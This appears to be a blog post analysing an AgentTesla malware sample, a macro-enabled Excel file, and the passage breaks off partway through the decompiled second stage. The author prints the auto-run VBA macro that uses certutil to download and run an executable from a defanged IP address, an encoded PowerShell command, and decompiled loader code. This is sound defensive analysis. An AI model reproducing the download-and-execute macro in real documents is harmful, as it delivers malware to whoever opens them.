<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="An AgentTesla Sample Using VBA Macros and Certutil" /><meta property="og:locale" content="en" /><meta name="description" content="AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/." /><meta property="og:description" content="AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/." /><link rel="canonical" href="https://forensicitguy.github.io/agenttesla-vba-certutil-download/" /><meta property="og:url" content="https://forensicitguy.github.io/agenttesla-vba-certutil-download/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-26T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="An AgentTesla Sample Using VBA Macros and Certutil" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-03-26T00:00:00+00:00","description":"AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/.","headline":"An AgentTesla Sample Using VBA Macros and Certutil","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/agenttesla-vba-certutil-download/"},"url":"https://forensicitguy.github.io/agenttesla-vba-certutil-download/"}</script><title>An AgentTesla Sample Using VBA Macros and Certutil | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Tony Lambert</a></h1><p class="site-subtitle fst-italic mb-0">An educator that does security things</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener noreferrer" > <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>An AgentTesla Sample Using VBA Macros and Certutil</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>An AgentTesla Sample Using VBA Macros and Certutil</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1648252800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 26, 2022 </time> </span> <span> Updated <time data-ts="1648508960" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 28, 2022 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2058 words" > <em>11 min</em> read</span></div></div></div></header><div class="content"><p>AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/">https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/</a>.</p><h2 id="triaging-the-first-stage"><span class="me-2">Triaging the first stage</span><a href="#triaging-the-first-stage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First stop, triage! MalwareBazaar claims the file is a XLSM Excel document but we should still verify just in case.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>diec mv_tvm.xlsm 
<span class="go">Binary
    Archive: Zip(2.0)[25.6%,1 file]
    Data: ZIP archive

</span><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>file mv_tvm.xlsm 
<span class="go">mv_tvm.xlsm: Microsoft Excel 2007+

</span><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>xxd mv_tvm.xlsm | <span class="nb">head</span>
<span class="go">00000000: 504b 0304 1400 0800 0800 780d 7954 7c5e  PK........x.yT|^
00000010: 7c2f 8e01 0000 1006 0000 1300 0000 5b43  |/............[C
00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d  ontent_Types].xm
00000030: 6ccd 544d 6fdb 300c fd2b 86ae 85a5 b487  l.TMo.0..+......
00000040: 6218 e2f4 b076 c7b5 c0ba 1fc0 484c ac46  b....v......HL.F
00000050: 5f10 d534 f9f7 a3ec 066b 0377 c8b0 0cd8  _..4.....k.w....
00000060: c516 f5f8 f81e 65ca f39b 9d77 cd16 33d9  ......e....w..3.
00000070: 183a 7129 67a2 c1a0 a3b1 61dd 891f 8f5f  .:q)g.....a...._
</span><span class="gp">00000080: db4f a2a1 02c1 808b 013b b147 1237 8bf9  .O.......;</span>.G.7..
<span class="gp">00000090: e33e 2135 cc0d d489 be94 f459 29d2 3d7a  .&gt;</span><span class="o">!</span>5.......Y<span class="o">)</span>.<span class="o">=</span>z
</pre></table></code></div></div><p>Detect-It-Easy thinks we have a ZIP archive and <code class="language-plaintext highlighter-rouge">file</code> thinks we have a Microsoft Excel 2007+ document. Both are correct as MS Excel 2007+ documents are essentially ZIP archives containing XML files. We can verify that assumption using <code class="language-plaintext highlighter-rouge">xxd</code> and seeing the file names of XML files within the XLSM document. Now we definitely know, this document is for MS Excel.</p><h2 id="analyzing-the-document-macro"><span class="me-2">Analyzing the document macro</span><a href="#analyzing-the-document-macro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The easiest way to grab low-hanging macro functionality for me is through <code class="language-plaintext highlighter-rouge">olevba</code>. In this case, the macro functionality is straightforward:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>olevba mv_tvm.xlsm 
<span class="go">olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: mv_tvm.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
PID = Shell("cmd /c certutil.exe -urlcache -split -f ""hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065.exe"" Lqdzvm.exe.exe &amp;&amp; Lqdzvm.exe.exe", vbHide)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |hxxp://18.179.111[.]24|URL                                          |
|          |0/xr0/loader/uploads|                                             |
|          |/scan08710203065.exe|                                             |
|IOC       |18.179.111[.]240      |IPv4 address                                 |
|IOC       |certutil.exe        |Executable file name                         |
|IOC       |scan08710203065.exe |Executable file name                         |
|IOC       |Lqdzvm.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
</span></pre></table></code></div></div><p>The macro contains a subroutine named <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.open"><code class="language-plaintext highlighter-rouge">Workbook_Open</code></a>, which launches when Excel opens this document. The subroutine executes a <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function"><code class="language-plaintext highlighter-rouge">Shell</code></a> command, which spawns <code class="language-plaintext highlighter-rouge">cmd.exe</code> and a <code class="language-plaintext highlighter-rouge">certutil.exe</code> process. The <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">certutil process</a> uses a <code class="language-plaintext highlighter-rouge">-urlcache</code> and <code class="language-plaintext highlighter-rouge">-split</code> command line option, downloads from the specified URL, and stores the contents within <code class="language-plaintext highlighter-rouge">Lqdzvm.exe.exe</code> Afterward, <code class="language-plaintext highlighter-rouge">cmd.exe</code> executes the downloaded EXE.</p><p>Since the VBA macro here is pretty brief, there’s not much else to investigate in the document. Let’s move on to the second stage, the downloaded EXE.</p><h2 id="analyzing-lqdzvmexeexe"><span class="me-2">Analyzing Lqdzvm.exe.exe</span><a href="#analyzing-lqdzvmexeexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can get a lead on this EXE using <code class="language-plaintext highlighter-rouge">diec</code> and <code class="language-plaintext highlighter-rouge">file</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>file Lqdzvm.exe.exe 
<span class="go">Lqdzvm.exe.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

</span><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>diec Lqdzvm.exe.exe 
<span class="go">PE32
    Protector: Smart Assembly(-)[-]
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(8.0)[GUI32]
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">file</code> output for the EXE indicates it is a Mono/.NET assembly for Windows. The <code class="language-plaintext highlighter-rouge">diec</code> command gets more specific, showing the EXE is also protected using <a href="https://www.red-gate.com/products/dotnet-development/smartassembly/">Smart Assembly</a>, a commercial obfuscator for .NET technologies. Using that knowledge we can attempt some deobfuscation and decompilation using <code class="language-plaintext highlighter-rouge">ilspycmd</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>de4dot Lqdzvm.exe.exe <span class="nt">-p</span> sa
<span class="go">
de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com
Latest version and source code: https://github.com/0xd4d/de4dot

Detected SmartAssembly 8.1.0.4892 (/home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exe)
Cleaning /home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exe
Renaming all obfuscated symbols
Saving /home/remnux/cases/tesla-xlsm/Lqdzvm.exe-cleaned.exe

</span><span class="gp">remnux@remnux:~/cases/tesla-xlsm$</span><span class="w"> </span>ilspycmd Lqdzvm.exe-cleaned.exe <span class="o">&gt;</span> Lqdzvm.exe-cleaned.decompiled.cs
</pre></table></code></div></div><p>From here we can examine the decompiled C# code, starting with the assembly properties.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">CompilationRelaxations</span><span class="p">(</span><span class="m">8</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">RuntimeCompatibility</span><span class="p">(</span><span class="n">WrapNonExceptionThrows</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">Debuggable</span><span class="p">(</span><span class="n">DebuggableAttribute</span><span class="p">.</span><span class="n">DebuggingModes</span><span class="p">.</span><span class="n">Default</span> <span class="p">|</span> <span class="n">DebuggableAttribute</span><span class="p">.</span><span class="n">DebuggingModes</span><span class="p">.</span><span class="n">DisableOptimizations</span> <span class="p">|</span> <span class="n">DebuggableAttribute</span><span class="p">.</span><span class="n">DebuggingModes</span><span class="p">.</span><span class="n">IgnoreSymbolStoreSequencePoints</span> <span class="p">|</span> <span class="n">DebuggableAttribute</span><span class="p">.</span><span class="n">DebuggingModes</span><span class="p">.</span><span class="n">EnableEditAndContinue</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTitle</span><span class="p">(</span><span class="s">"BandiFix"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyDescription</span><span class="p">(</span><span class="s">"BandiFix"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyConfiguration</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCompany</span><span class="p">(</span><span class="s">"Bandicam.com"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyProduct</span><span class="p">(</span><span class="s">"BandiFix"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCopyright</span><span class="p">(</span><span class="s">"Copyright(c) 2010-2020 Bandicam.com.  All rights reserved."</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTrademark</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">ComVisible</span><span class="p">(</span><span class="k">false</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">Guid</span><span class="p">(</span><span class="s">"3659e84e-1949-4909-85ac-f5710802a51c"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyFileVersion</span><span class="p">(</span><span class="s">"2.0.0.111"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">TargetFramework</span><span class="p">(</span><span class="s">".NETFramework,Version=v4.0"</span><span class="p">,</span> <span class="n">FrameworkDisplayName</span> <span class="p">=</span> <span class="s">".NET Framework 4"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyVersion</span><span class="p">(</span><span class="s">"2.0.0.111"</span><span class="p">)]</span>
</pre></table></code></div></div><p>The assembly properties/attributes here resemble those for the Bandicam BandiFix application. The adversary is likely trying to masquerade as the application to avoid attention. The GUID <code class="language-plaintext highlighter-rouge">3659e84e-1949-4909-85ac-f5710802a51c</code> in this EXE is a <a href="https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/">TypeLib ID GUID</a>. You can potentially use the property in VT or other tools to pivot and find similar EXEs.</p><p>Next, we can dive into the entry point, <code class="language-plaintext highlighter-rouge">Main()</code>.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">namespace</span> <span class="nn">ns0</span>
<span class="p">{</span>
	<span class="k">internal</span> <span class="k">class</span> <span class="nc">Class0</span>
	<span class="p">{</span>
		<span class="p">[</span><span class="n">STAThread</span><span class="p">]</span>
		<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
		<span class="p">{</span>
			<span class="n">Class1</span><span class="p">.</span><span class="nf">smethod_0</span><span class="p">();</span>
			<span class="n">Class1</span><span class="p">.</span><span class="nf">smethod_1</span><span class="p">();</span>
			<span class="n">Class2</span><span class="p">.</span><span class="nf">smethod_1</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Main()</code> function is pretty simple, branching off to three other methods defined in two classes. Let’s jump into the code at <code class="language-plaintext highlighter-rouge">Class1.smethod_0()</code> to see it.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">class</span> <span class="nc">Class1</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="k">void</span> <span class="nf">smethod_0</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">ProcessStartInfo</span> <span class="n">val</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ProcessStartInfo</span><span class="p">();</span>
        <span class="n">val</span><span class="p">.</span><span class="nf">set_FileName</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">);</span>
        <span class="n">val</span><span class="p">.</span><span class="nf">set_Arguments</span><span class="p">(</span><span class="s">"-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMgAwAA=="</span><span class="p">);</span>
        <span class="n">val</span><span class="p">.</span><span class="nf">set_WindowStyle</span><span class="p">((</span><span class="n">ProcessWindowStyle</span><span class="p">)</span><span class="m">1</span><span class="p">);</span>
        <span class="n">Process</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="nf">WaitForExit</span><span class="p">();</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">ServicePointManager</span><span class="p">.</span><span class="nf">set_SecurityProtocol</span><span class="p">((</span><span class="n">SecurityProtocolType</span><span class="p">)</span><span class="m">3072</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">catch</span>
        <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>This method creates a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-6.0">ProcessStartInfo</a> object, fills its properties with values to launch PowerShell with a base64-encoded command line, <a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processwindowstyle?view=net-6.0">sets the window style to hidden</a>, and starts the PowerShell process. The encoded PowerShell command decodes to <code class="language-plaintext highlighter-rouge">Start-Sleep -Seconds 20</code>. Combined with the <code class="language-plaintext highlighter-rouge">WaitForExit()</code> function when started, this shows the code waits/sleeps for 20 seconds before moving to the next step. In the next step, the code sets the .NET ServicePointManager’s <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.securityprotocoltype?view=net-6.0">SecurityProtocol property to TLS1.2</a>.</p><p>Now we can move into the next function, <code class="language-plaintext highlighter-rouge">Class1.smethod_1()</code>.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="k">void</span> <span class="nf">smethod_1</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">&gt;();</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Class2</span><span class="p">.</span><span class="nf">smethod_0</span><span class="p">();</span>
    <span class="n">Stack</span> <span class="n">val</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Stack</span><span class="p">();</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="s">"Welcome"</span><span class="p">);</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="s">"Tutlane"</span><span class="p">);</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="m">20.5f</span><span class="p">);</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="m">10</span><span class="p">);</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="k">null</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">num</span><span class="p">--</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">num</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">val</span><span class="p">.</span><span class="nf">Push</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="m">100</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="kt">object</span><span class="p">?</span> <span class="n">item</span> <span class="k">in</span> <span class="n">val</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">item</span><span class="p">);</span>
    <span class="p">}</span>
